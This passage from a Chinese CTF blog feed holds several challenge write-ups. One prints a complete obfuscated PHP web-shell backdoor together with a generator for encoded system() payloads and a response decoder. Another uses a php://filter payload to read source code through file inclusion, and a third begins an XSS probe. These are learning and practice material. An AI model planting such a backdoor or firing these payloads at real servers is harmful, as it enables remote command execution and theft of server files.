$o;&#125;$r=$_SERVER;$rr=@$r[&quot;HTTP_REFERER&quot;];$ra=@$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];if($rr&amp;&amp;$ra)&#123;$u=parse_url($rr);parse_str($u[&quot;query&quot;],$q);$q=array_values($q);preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;,$ra,$m);if($q&amp;&amp;$m)&#123;@session_start();$s=&amp;$_SESSION;$ss=&quot;substr&quot;;$sl=&quot;strtolower&quot;;$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p=&quot;&quot;;for($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0)&#123;$s[$i]=&quot;&quot;;$p=$ss($p,3);&#125;if(array_key_exists($i,$s))&#123;$s[$i].=$p;$e=strpos($s[$i],$f);if($e)&#123;$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);@session_destroy();&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>上边这段代码整理后放到具有代码高亮功能的编辑器里面会发现<br><img src="/2019/04/16/后门利用题目/Image0002.png" alt><br>说明这段代码语法有问题，经过对输出$L变量的网页源代码进行查看发现<br><img src="/2019/04/16/后门利用题目/Image0003.png" alt><br>原来代码里面包含“&lt;”被当成HTML标签解析了。重新获得源码并整理后获得如下结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//用于加密的字符串变量</span><br><span class="line">$kh = &quot;d03a&quot;;   </span><br><span class="line">$kf = &quot;1f3c&quot;;</span><br><span class="line"></span><br><span class="line">//x() 函数是一个按位异或函数</span><br><span class="line">function x($t, $k) &#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; $l;) &#123;  //从第一个字符串头部开始直至结尾  </span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;  //每次均从字符串二的头部开始异或 若其中任意一个长度不足则结束</span><br><span class="line">            $o.= $t&#123;$i&#125; ^ $k&#123;$j&#125;;                        // 若i未到字符串一结尾 则从二号头部重新开始继续i位置起的异或</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;//返回结果</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//这里给出了两个我们可以控制的变量，是从响应头传递的参数</span><br><span class="line">$r = $_SERVER;</span><br><span class="line">$rr = @$r[&quot;HTTP_REFERER&quot;];//接受HTTP响应头里referer参数</span><br><span class="line">$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];//接受HTTP响应头里 accept-language参数</span><br><span class="line"></span><br><span class="line">if ($rr &amp;&amp; $ra) &#123;</span><br><span class="line">    $u = parse_url($rr);//对rr进行URL解析 结果给数组u</span><br><span class="line">    parse_str($u[&quot;query&quot;], $q);//把u数组query字段的值进行解析，结果给数组q</span><br><span class="line">    $q = array_values($q);//去除数组键名 只保留键值</span><br><span class="line">    preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;, $ra, $m); //对ta进行一个正则表达式处理，结果给二维数组m</span><br><span class="line">    if ($q &amp;&amp; $m) &#123;</span><br><span class="line">        @session_start();//开启session</span><br><span class="line">        $s = &amp; $_SESSION;//获取session的引用</span><br><span class="line">        $ss = &quot;substr&quot;;//截取</span><br><span class="line">        $sl = &quot;strtolower&quot;;//小写转换</span><br><span class="line">        $i = $m[1][0] . $m[1][1];//i等于m[1][0],m[1][1]两个值的拼接</span><br><span class="line">        $h = $sl($ss(md5($i . $kh) , 0, 3));//h是i和kh拼接后进行md5加密的前三个字符的小写</span><br><span class="line">        $f = $sl($ss(md5($i . $kf) , 0, 3));//f是i和kf拼接后进行md5加密的前三个字符的小写</span><br><span class="line">        $p = &quot;&quot;;</span><br><span class="line">        for ($z = 1; $z &lt; count($m[1]); $z++) $p.= $q[$m[2][$z]];//p是对q[$m[2][$z]的拼接</span><br><span class="line">        if (strpos($p, $h) === 0) &#123; //判断h是否出现在p的开头</span><br><span class="line">            $s[$i] = &quot;&quot;;//session的$i字段置空</span><br><span class="line">            $p = $ss($p, 3);//p截取前三个字符</span><br><span class="line">        &#125;</span><br><span class="line">        if (array_key_exists($i, $s)) &#123;//检查键名$i是否在数组s里面</span><br><span class="line">            $s[$i].= $p;//session的$i字段拼接上p</span><br><span class="line">            $e = strpos($s[$i], $f);//e为f在session的i字段里面的出现位置</span><br><span class="line">            if ($e) &#123;</span><br><span class="line">                $k = $kh . $kf;//拼接kh kf 给k</span><br><span class="line">                ob_start();//打开缓冲区 保存发送给浏览器的数据</span><br><span class="line">                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(  //截取session的i字段的前e个字符</span><br><span class="line">                    &quot;/_/&quot;,   //将截取字符里的_ -替换为/ +</span><br><span class="line">                    &quot;/-/&quot;   //进行base64解密</span><br><span class="line">                ) , array(   //加密结果与k一起 进行x的按位异或运算</span><br><span class="line">                    &quot;/&quot;,   //解压缩</span><br><span class="line">                    &quot;+&quot;   //执行解压后的代码</span><br><span class="line">                ) , $ss($s[$i], 0, $e))) , $k)));</span><br><span class="line">                $o = ob_get_contents();//得到缓冲区内容</span><br><span class="line">                ob_end_clean();//清空缓冲区</span><br><span class="line">                $d = base64_encode(x(gzcompress($o) , $k));//对缓冲区内容连同k一起按位异或并压缩，再进行base64加密</span><br><span class="line">                print (&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);//打印加密结果</span><br><span class="line">                @session_destroy();//销毁session</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>看完代码的作用之后，先来说一下大体流程：<br><strong>获取参数-&gt;提取参数值-&gt;解码-&gt;执行-&gt;结果加密-&gt;输出</strong><br>所以我们主要解决的问题就是怎么把我们的payload通过参数传进去，和加解密，由于加解密的方法使用的是同一个，所以我们知道如何加密也就知道如何解密了。</p><p>我们可控制的参数有两个，一个是referer一个是accept-language。从代码来看referer·的内容是用来执行的，但是怎么获取referer里面的值是通过accept-language来计算的。</p><p>所以简单说referer的值里面包含我们的payload，language控制获取。</p><p>所以我们先要搞清楚怎么把1传进去让它正常获取，就能知道如何把payload放进去了。也就是我们的第一个目标是accept-language。</p><p>可以本地运行一下backdoor.php通过Burp suite来修改accept-language的值看看，通过正则表达式转换后的m数组是什么。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; Array ( [0] =&gt; zh-CN, [1] =&gt; zh;q=0.9 ) [1] =&gt; Array ( [0] =&gt; z [1] =&gt; z ) [2] =&gt; Array ( [0] =&gt; [1] =&gt; 9 ) )</span><br></pre></td></tr></table></figure></p><p>这是language设置为 <strong>zh-CN,zh;q=0.9</strong> 。简单说一下就是每个默认语言用，隔开第一个是默认语言，q代表权重。有了上边的输出结果，后边的取值就很清楚了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ($z = 1; $z &lt; count($m[1]); $z++) $p.= $q[$m[2][$z]];//p是对q[$m[2][$z]的拼接</span><br></pre></td></tr></table></figure></p><p>这段代码现在来看就不难分析了，按照上边的测试情况的话，p的取值应该是q[]和q[9];所以我们只需要修改language让它取比如0的话，那么我们可以把referer的值构造为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/backdoor.php?a=payload</span><br></pre></td></tr></table></figure></p><p>这样p的取值就是参数0也就是第一个参数即a的值。同时经过测试发现<strong>zh-CN,zh;q=0.0</strong>恰好为我们需要的参数值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; Array ( [0] =&gt; zh-CN, [1] =&gt; zh;q=0.0 ) [1] =&gt; Array ( [0] =&gt; z [1] =&gt; z ) [2] =&gt; Array ( [0] =&gt; [1] =&gt; 0 ) )</span><br></pre></td></tr></table></figure></p><p>从下面连续两个if判断来看，第一个if是需要我们满足payload的开头三个字符是h变量，这样s才会置空，并正确与后边的payload在第二个if里面进行拼接。同时eval函数里面对后边的字符进行了切除，切除部分恰好就是f。</p><p>所以我们的payload需要满足头尾分别是h和f。所以我们需要输出一下这两个的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6b3</span><br><span class="line">ebc</span><br></pre></td></tr></table></figure></p><p>现在我们的payload更进一步了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/backdoor.php?a=6b3payloadebc</span><br></pre></td></tr></table></figure></p><p>接下来的事情反而简单了，关于异或运算可以通过a = b ^ c那么 b = a ^ c的逆运算来解决。<br>然后使用PHP的 <strong>base64_decode()、base64_encode()、gzcompress()、gzuncompress()</strong> ，四个函数分别来进行加解密，压缩，解压。</p><p>于是构造payload的代码就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function x($t,$k) &#123; </span><br><span class="line">    $c=strlen($k); </span><br><span class="line">    $l=strlen($t); </span><br><span class="line">    $o=&quot;&quot;; </span><br><span class="line">    for($i=0; $i&lt;$l;) &#123;</span><br><span class="line">        for($j=0; ($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++) &#123; </span><br><span class="line">            $o.= $t&#123;$i&#125; ^ $k&#123;$j&#125;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    return $o; </span><br><span class="line">&#125;</span><br><span class="line">function payload($cmd)&#123;</span><br><span class="line">    $str = &apos;system(&quot;&apos; . $cmd . &apos;&quot;);&apos;;</span><br><span class="line">    $t = gzcompress($str);</span><br><span class="line">    $t = x($t, &apos;d03a1f3c&apos;);</span><br><span class="line">    $t = base64_encode($t);</span><br><span class="line">    echo &quot;6b3&quot;.$t . &quot;ebc&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">payload(&apos;指令&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/04/16/后门利用题目/Image0004.png" alt></p><p>通过引入错误页面可以看到服务器系统是Debian。所以我们要读取文件的话要用的指令是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php</span><br></pre></td></tr></table></figure></p><p>该指令通过自己的脚本生成的结果是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6b3HKwYzx1Ieq6xYHkvHTd7qC185Er5TmOx0DYzBKhh7Q==ebc</span><br></pre></td></tr></table></figure></p><p>记得传递payload的时候确定language是<strong>zh-CN,zh;q=0.0</strong><br><img src="/2019/04/16/后门利用题目/Image0005.png" alt><br>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKyA0B6uG4OB4uQ2YS/4KihngzRhYeK29TaSkHSXeibtVZqQFGDCpp22cydwN00x6oFczItTHHRkzkZzAw==</span><br></pre></td></tr></table></figure><p>看来后门程序运行了，把经过加密的结果给我们了。</p><p>我们现在只需要解码就可以了，怎么解已经说过了，下面上代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function x($t,$k) &#123; </span><br><span class="line">    $c=strlen($k); </span><br><span class="line">    $l=strlen($t); </span><br><span class="line">    $o=&quot;&quot;; </span><br><span class="line">    for($i=0; $i&lt;$l;) &#123;</span><br><span class="line">        for($j=0; ($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++) &#123; </span><br><span class="line">            $o.= $t&#123;$i&#125; ^ $k&#123;$j&#125;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    return $o; </span><br><span class="line">&#125;</span><br><span class="line">function get_answer($str)&#123;</span><br><span class="line">    $str = base64_decode($str);</span><br><span class="line">    $str = x($str, &apos;d03a1f3c&apos;);</span><br><span class="line">    $str = gzuncompress($str);</span><br><span class="line">    echo $str . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">get_answer(&apos;需要解密的内容&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这段代码是没有任何问题的，但是你会发现怎么也解不出来结果，这个地方我困扰了很长时间，考虑了各个环节，最终发现是出题者“皮”了一下，我们的代码跟思路没有任何问题，问题在于我们的linux指令，cat 是正序输出文件，tac是倒叙，这里出题者设置了一个小坎就是flag的内容是倒叙的，所以把linux指令换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac flag.php</span><br></pre></td></tr></table></figure></p><p>重复上述步骤后得到<br><img src="/2019/04/16/后门利用题目/Image0006.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一道后门利用题目，程序开发人员预留了一个后门程序，我们需要通过这个后门程序来获取flag。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题目&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/04/16/后门利用题目/Image0001.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;题目说有三个页面，一个是我们现在看到的主页面index还有两个分别是我们需要获得的flag.php和可以利用的backdoor.php。&lt;/p&gt;
&lt;p&gt;直接访问flag.php发现页面什么都没有，说明flag位于源码里面，我们需要通过后门程序读取flag.php的源码。&lt;/p&gt;
&lt;p&gt;backdoor.php直接进入该页面也是什么都没有，说明它的调用方式是通过参数传递来实现的（想必谁也不会愚蠢到给自己的后门程序留一个明目张胆的登录界面吧！- -），所以该文件提供了源文件的下载。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;backdoor.php 源码&lt;/strong&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP利用文件包含漏洞</title>
    <link href="https://kkkiona.github.io/2019/04/15/PHP%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>https://kkkiona.github.io/2019/04/15/PHP利用文件包含漏洞/</id>
    <published>2019-04-15T12:48:21.000Z</published>
    <updated>2019-04-15T12:52:30.320Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>这是一道文件包含漏洞的题目。</p><p>简单介绍一下文件包含，文件包含简单来说就是在一个文件里面引入另一个文件。拿最通俗的C语言来说，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br></pre></td></tr></table></figure></p><p>这就是最简单的文件包含，编一阶段编译器会把stdio.h直接包含进来。</p><p>PHP提供了四种包含方式，分别是include(),include_once(),require()和require_once()。这四个都可以进行文件包含，但有区别</p><p>require 找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本。</p><p>include 找不到被包含的文件时只会产生警告(E_WARNING)，脚本继续执行。</p><p>include_once 此语句和include雷系，唯一区别就是如果该文件中的代码已经被包含，则不会再次包含。</p><p>require_once 此语句和require类似，唯一区别就是如果该文件中的代码已经被包含。则不会再次包含。</p><p>如果是静态的文件包含几乎不会出问题，但是如果文件包含是动态的比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($_GET[&apos;&apos;flie&apos;])</span><br></pre></td></tr></table></figure><p>这样裸露的包含外部文件很容易造成恶意代码的注入。<br><a id="more"></a><br><strong>题目</strong></p><p><img src="/2019/04/15/PHP利用文件包含漏洞/Image0001.png" alt><br><img src="/2019/04/15/PHP利用文件包含漏洞/Image0002.png" alt></p><p>这道题是基础的文件包含题目所以不是很难，从题目可以很清楚的看到页面利用了文件包含来实现页面跳转，而我们要的flag文件应该就包含在flag.php里面，我们要做的就是从flag.php源码里面读出来。</p><p>由于我们需要的是获取源码而不是运行flag.php这个文件，所以我们需要访问本地文件，在此顺便补充一下。</p><p>PHP文件包含分为两种，一种是<strong>本地文件包含</strong>，它是通过浏览器包含web服务器上的文件，显然本题目是本地文件包含漏洞。</p><p>第二种是<strong>远程文件包含</strong>，它允许包含远程服务器上的文件，这就允许黑客上传远端payload。这种包含<br>需要确定PHP是否开启远程包含选项 在php.ini文件中修改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include=Off              //把Off改为On</span><br></pre></td></tr></table></figure></p><p>由于是PHP页面我们可以使用PHP的方法来获取flag的源码。<br>这里使用的是PHP封装协议（伪协议）。PHP封装协议就是一些内置的URL风格的封装协议。</p><p>常用的有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></p><p>我们要获取的是流文件，因此我们选用php:// ，同时我们需要一个过滤器filter来过滤数据流。因为流里面的数据很多，我们需要过滤出flag.php的数据。</p><p>所以构造代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=flag</span><br></pre></td></tr></table></figure></p><p>resource参数指定目标文件。同时我们需要read参数来读取文件，这里值得注意的是，文件包含对文件的后缀名并不关心，比如我的文件叫flag.txt ，但是里面使用了合法的盘后票语句，那么read进来以后浏览器依然会把它作为php文件执行，而不是读取内容。哪怕换成.jpg也一样。</p><p>所以在获取php文件的时候要进行base64编码，不然会被执行。</p><p>所以最终我构造的代码是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><p>得到一串编码<br><img src="/2019/04/15/PHP利用文件包含漏洞/Image0003.png" alt></p><p>解码之后<br><img src="/2019/04/15/PHP利用文件包含漏洞/Image0004.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一道文件包含漏洞的题目。&lt;/p&gt;
&lt;p&gt;简单介绍一下文件包含，文件包含简单来说就是在一个文件里面引入另一个文件。拿最通俗的C语言来说，&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这就是最简单的文件包含，编一阶段编译器会把stdio.h直接包含进来。&lt;/p&gt;
&lt;p&gt;PHP提供了四种包含方式，分别是include(),include_once(),require()和require_once()。这四个都可以进行文件包含，但有区别&lt;/p&gt;
&lt;p&gt;require 找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本。&lt;/p&gt;
&lt;p&gt;include 找不到被包含的文件时只会产生警告(E_WARNING)，脚本继续执行。&lt;/p&gt;
&lt;p&gt;include_once 此语句和include雷系，唯一区别就是如果该文件中的代码已经被包含，则不会再次包含。&lt;/p&gt;
&lt;p&gt;require_once 此语句和require类似，唯一区别就是如果该文件中的代码已经被包含。则不会再次包含。&lt;/p&gt;
&lt;p&gt;如果是静态的文件包含几乎不会出问题，但是如果文件包含是动态的比如&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;include($_GET[&amp;apos;&amp;apos;flie&amp;apos;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样裸露的包含外部文件很容易造成恶意代码的注入。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>图灵</title>
    <link href="https://kkkiona.github.io/2019/04/14/%E5%9B%BE%E7%81%B5/"/>
    <id>https://kkkiona.github.io/2019/04/14/图灵/</id>
    <published>2019-04-14T12:12:56.000Z</published>
    <updated>2019-04-14T12:13:19.806Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>搞了一天多博客 总算基本 把bug都弄好了 ，机器人 也弄山来了，但是跨域问题 影响了API接入，目前还是个小傻子。。。明天应该就能完成了，把之前的坑填了。<br><img src="https://img-blog.csdnimg.cn/20190414211250896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0MzMyNDk1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="随笔" scheme="https://kkkiona.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>19-4-13</title>
    <link href="https://kkkiona.github.io/2019/04/13/19-4-13/"/>
    <id>https://kkkiona.github.io/2019/04/13/19-4-13/</id>
    <published>2019-04-13T13:31:57.000Z</published>
    <updated>2019-04-13T13:32:42.386Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>更换了模板 存在一些bug还未完全修复 暂时无法更新带图片的博客。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SSTI服务端模板注入</title>
    <link href="https://kkkiona.github.io/2019/04/12/SSTI%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>https://kkkiona.github.io/2019/04/12/SSTI服务端模板注入/</id>
    <published>2019-04-12T09:58:35.000Z</published>
    <updated>2019-04-15T06:07:53.715Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>题目：</strong>Confusion 1**<br><img src="/2019/04/12/SSTI服务端模板注入/Image0001.png" alt><br>这道题目名字就叫 “困惑”，乍一看确实让人困惑，整个界面就是一张图片还有两个跳转，两个跳转还都是404。<br><a id="more"></a><br><img src="/2019/04/12/SSTI服务端模板注入/Image0002.png" alt><br>但其实有不是那么困惑，因为题目里写了QCTF2018。。。</p><p>以下是我整个解这道题的完整过程，由于题目说明里面提示图片很关键，我首先查看的是图片，我知道Python是蛇的意思，所以我认为这道题必然牵扯Python。F12看到<br><img src="/2019/04/12/SSTI服务端模板注入/Image0003.png" alt><br>似乎没啥特别，下载下来看一下，因为我知道有些线索可能写在了图片属性里面，或者图片加密。<br><img src="/2019/04/12/SSTI服务端模板注入/Image0004.png" alt><br>似乎并无异样。用binwalk跑了一下也没有发现结果。由于知识有限并不清楚还有什么其它图片利用方法，于是我决定先把眼光转向其它线索，题目还提示要找到input的地方。我观察了一下主页面的HTML代码发现并没有被设置为“hidden”的隐藏input标签。</p><p>然而在检查login.php的404的时候发现代码里有线索。<br><img src="/2019/04/12/SSTI服务端模板注入/Image0005.png" alt><br><img src="/2019/04/12/SSTI服务端模板注入/Image0006.png" alt><br>看来这个文件里面应该是有我们需要的flag。<br><img src="/2019/04/12/SSTI服务端模板注入/Image0007.png" alt><br>并访问不了。我猜测这个404页面可能做了伪装，虽然题目说了“Scanner is useless”。但是我还是决定用kali扫一下。当然结果肯定是没有什么有用的发现。（我的kali在U盘上，用的是live模式不好截图就不放出来了）。</p><p>我猜测会不会这个页面隐藏了GET参数，可以用来登录之类的。我尝试给比较常见的变量名“user”传递一个值看看有什么反应。<br><img src="/2019/04/12/SSTI服务端模板注入/Image0008.png" alt><br>没什么反应。感觉有点手足无措，想到之前已经做过XSS和SQL注入的题了，应该不会用XSS来做，但是我决定还是试一下。输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/12/SSTI服务端模板注入/Image0009.png" alt><br>出乎意料的竟然执行了。尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Var fso=new ActiveXObject(Scripting.FileSystemObject); </span><br><span 